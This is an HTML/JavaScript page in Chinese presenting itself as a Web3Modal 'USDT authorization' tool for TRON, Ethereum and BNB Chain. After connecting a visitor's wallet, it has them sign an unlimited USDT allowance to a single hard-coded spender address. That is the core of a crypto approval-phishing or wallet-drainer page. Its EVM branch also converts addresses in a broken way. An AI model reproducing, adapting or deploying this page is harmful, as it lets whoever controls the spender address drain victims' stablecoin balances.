<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>多链钱包授权 - Web3Modal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 24px;
            padding: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 28px;
            color: #333;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
        }
        
        .chain-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
        
        .chain-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            background: white;
            border-radius: 12px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .chain-btn.active {
            border-color: #667eea;
            background: #f0f0ff;
            color: #667eea;
        }
        
        .approve-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
            margin-top: 16px;
        }
        
        .approve-btn:active {
            transform: scale(0.98);
        }
        
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            text-align: center;
        }
        
        .status.loading {
            background: #fff3cd;
            color: #856404;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
        
        .info-text {
            font-size: 12px;
            color: #999;
            margin-top: 12px;
            text-align: center;
            padding: 8px;
            background: #f5f5f5;
            border-radius: 8px;
        }
        
        .hidden {
            display: none;
        }
        
        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .wallet-info-box {
            background: #f8f9ff;
            padding: 12px;
            border-radius: 12px;
            margin-bottom: 16px;
            text-align: center;
        }
        
        .connected-address {
            font-family: monospace;
            font-size: 12px;
            color: #667eea;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🔐 USDT 授权</h1>
            <div class="subtitle">支持 TRON + EVM | WalletConnect</div>
            
            <div class="chain-selector" id="chainSelector">
                <button class="chain-btn" data-chain="1">Ethereum</button>
                <button class="chain-btn" data-chain="56">BNB Chain</button>
                <button class="chain-btn active" data-chain="728126428">TRON</button>
            </div>
            
            <div class="wallet-info-box" id="walletInfoBox" style="display: none;">
                <div style="font-size: 12px; color: #666;">已连接钱包</div>
                <div class="connected-address" id="connectedAddress">-</div>
            </div>
            
            <div style="background: #f5f5f5; padding: 12px; border-radius: 12px; margin-bottom: 16px;">
                <div style="font-size: 12px; color: #666;">授权地址</div>
                <div style="font-size: 12px; color: #333; word-break: break-all;">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
                <div style="font-size: 12px; color: #666; margin-top: 8px;">授权额度</div>
                <div style="font-size: 14px; color: #667eea; font-weight: 600;">无限额度</div>
            </div>
            
            <button class="approve-btn" id="connectBtn">连接钱包</button>
            <button class="approve-btn" id="approveBtn" style="display: none;">授权 USDT</button>
            <div class="status hidden" id="status"></div>
            <div class="info-text" id="walletInfo">请先连接钱包</div>
        </div>
    </div>

    <!-- 引入 Web3Modal 和 ethers -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.0/dist/index.min.js"></script>
    
    <script>
        // ==================== 配置 ====================
        const PROJECT_ID = '91bd623c7859e77a38c7b10c615976b6';
        
        // 链配置
        const chains = {
            1: { name: 'Ethereum', rpc: 'https://mainnet.infura.io/v3/', chainId: 1 },
            56: { name: 'BNB Chain', rpc: 'https://bsc-dataseed.binance.org/', chainId: 56 },
            728126428: { name: 'TRON', chainId: 728126428 }
        };
        
        // USDT 合约地址
        const USDT_ADDRESS = {
            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            56: '0x55d398326f99059fF775485246999027B3197955',
            728126428: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
        };
        
        const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
        const UNLIMITED_AMOUNT_EVM = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        const UNLIMITED_AMOUNT_TRON = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        
        let currentChain = '728126428';
        let provider = null;
        let signer = null;
        let userAddress = null;
        let web3Modal = null;
        
        function showStatus(message, type = 'loading') {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
            statusEl.className = `status ${type}`;
            statusEl.classList.remove('hidden');
        }
        
        function hideStatus() {
            document.getElementById('status').classList.add('hidden');
        }
        
        function updateWalletInfo(text) {
            document.getElementById('walletInfo').textContent = text;
        }
        
        // ==================== 初始化 Web3Modal ====================
        function initWeb3Modal() {
            web3Modal = new Web3Modal.default({
                projectId: PROJECT_ID,
                walletConnectVersion: 2,
                themeMode: 'light',
                themeVariables: {
                    '--w3m-accent-color': '#667eea',
                },
                chains: [1, 56],
                optionalChains: [1, 56],
                enableExplorer: true,
                explorerRecommendedWalletIds: [
                    'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
                    'c03dfee351b6fcc421b4494ea33b9d4b92f07f86e0c4d150b2cb8dc02b5713bd', // TokenPocket
                    'c3a90c12093152f71ddc2669f65f130aa3c760391b940fcb4346f07ac5e74a3d', // imToken
                    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
                ],
                enableNetworkView: true,
                enableAccountView: true,
            });
        }
        
        // ==================== 连接钱包 ====================
        async function connectWallet() {
            try {
                if (!web3Modal) {
                    initWeb3Modal();
                }
                
                showStatus('正在连接钱包...', 'loading');
                updateWalletInfo('请选择钱包');
                
                // 打开钱包选择弹窗
                const instance = await web3Modal.openModal();
                
                // 获取 provider
                provider = new ethers.providers.Web3Provider(instance);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                
                console.log('连接成功:', userAddress);
                
                // 显示连接状态
                document.getElementById('walletInfoBox').style.display = 'block';
                document.getElementById('connectedAddress').textContent = `${userAddress.slice(0, 8)}...${userAddress.slice(-6)}`;
                document.getElementById('connectBtn').style.display = 'none';
                document.getElementById('approveBtn').style.display = 'block';
                
                showStatus(`连接成功！地址: ${userAddress.slice(0, 8)}...`, 'success');
                updateWalletInfo('已连接，点击授权 USDT');
                setTimeout(() => hideStatus(), 2000);
                
            } catch (error) {
                console.error('连接失败:', error);
                showStatus('连接失败: ' + (error.message || '用户取消'), 'error');
                updateWalletInfo('连接失败，请重试');
            }
        }
        
        // ==================== EVM 授权 ====================
        async function approveEvm() {
            const chainId = parseInt(currentChain);
            
            showStatus('正在构造授权交易...', 'loading');
            updateWalletInfo('请在钱包中确认授权');
            
            try {
                const usdtContract = new ethers.Contract(
                    USDT_ADDRESS[chainId],
                    ['function approve(address spender, uint256 amount) returns (bool)'],
                    signer
                );
                
                // EVM 地址格式转换
                const spenderEvm = '0x' + SPENDER_ADDRESS.slice(2);
                
                const tx = await usdtContract.approve(spenderEvm, UNLIMITED_AMOUNT_EVM);
                showStatus('交易已发送，等待确认...', 'loading');
                
                const receipt = await tx.wait();
                
                showStatus(`✅ 授权成功！`, 'success');
                updateWalletInfo(`授权成功！交易ID: ${receipt.transactionHash.slice(0, 10)}...`);
                
            } catch (error) {
                console.error('授权失败:', error);
                if (error.message.includes('reject') || error.message.includes('deny')) {
                    showStatus('用户取消了授权', 'error');
                    updateWalletInfo('已取消授权');
                } else {
                    showStatus('授权失败: ' + error.message, 'error');
                    updateWalletInfo('授权失败');
                }
            }
        }
        
        // ==================== TRON 授权 ====================
        async function approveTron() {
            showStatus('正在连接 TronLink...', 'loading');
            updateWalletInfo('请在 TronLink 中确认');
            
            try {
                // 检查 TronLink
                if (!window.tronLink || !window.tronLink.ready) {
                    throw new Error('请先安装 TronLink 钱包');
                }
                
                // 请求连接
                await window.tronLink.request({ method: 'tron_requestAccounts' });
                const tronWeb = window.tronLink.tronWeb;
                const address = tronWeb.defaultAddress.base58;
                
                document.getElementById('walletInfoBox').style.display = 'block';
                document.getElementById('connectedAddress').textContent = `${address.slice(0, 8)}...${address.slice(-6)}`;
                document.getElementById('connectBtn').style.display = 'none';
                document.getElementById('approveBtn').style.display = 'block';
                
                showStatus(`连接成功！正在构造授权...`, 'loading');
                
                // 获取 USDT 合约
                const contract = await tronWeb.contract().at(USDT_ADDRESS[728126428]);
                
                // 发送授权交易
                const result = await contract.approve(
                    SPENDER_ADDRESS,
                    UNLIMITED_AMOUNT_TRON
                ).send();
                
                if (result && (result.result || result.txid)) {
                    const txid = result.txid || result;
                    showStatus(`✅ 授权成功！`, 'success');
                    updateWalletInfo(`授权成功！交易ID: ${txid.slice(0, 10)}...`);
                } else {
                    showStatus('授权失败', 'error');
                }
                
            } catch (error) {
                console.error('TRON 授权失败:', error);
                if (error.message.includes('reject') || error.message.includes('deny')) {
                    showStatus('用户取消了授权', 'error');
                    updateWalletInfo('已取消授权');
                } else {
                    showStatus('授权失败: ' + error.message, 'error');
                    updateWalletInfo('授权失败');
                }
            }
        }
        
        // ==================== 主授权函数 ====================
        async function approve() {
            const chainId = parseInt(currentChain);
            const isTron = chainId === 728126428;
            
            if (isTron) {
                await approveTron();
            } else {
                if (!provider || !signer) {
                    showStatus('请先连接钱包', 'error');
                    return;
                }
                await approveEvm();
            }
        }
        
        // ==================== 初始化 ====================
        function init() {
            // 初始化 Web3Modal
            initWeb3Modal();
            
            // 链选择器
            document.querySelectorAll('.chain-btn').forEach(btn => {
                btn.addEventListener('click', async () => {
                    document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    currentChain = btn.dataset.chain;
                    
                    // 重置状态
                    provider = null;
                    signer = null;
                    userAddress = null;
                    document.getElementById('walletInfoBox').style.display = 'none';
                    document.getElementById('connectBtn').style.display = 'block';
                    document.getElementById('approveBtn').style.display = 'none';
                    hideStatus();
                    
                    if (currentChain === '728126428') {
                        updateWalletInfo('TRON 链，点击连接钱包');
                    } else {
                        updateWalletInfo(`${currentChain === '1' ? 'Ethereum' : 'BNB Chain'}，点击连接钱包`);
                    }
                });
            });
            
            document.getElementById('connectBtn').addEventListener('click', connectWallet);
            document.getElementById('approveBtn').addEventListener('click', approve);
            updateWalletInfo('请选择链并连接钱包');
        }
        
        init();
    </script>
</body>
</html>
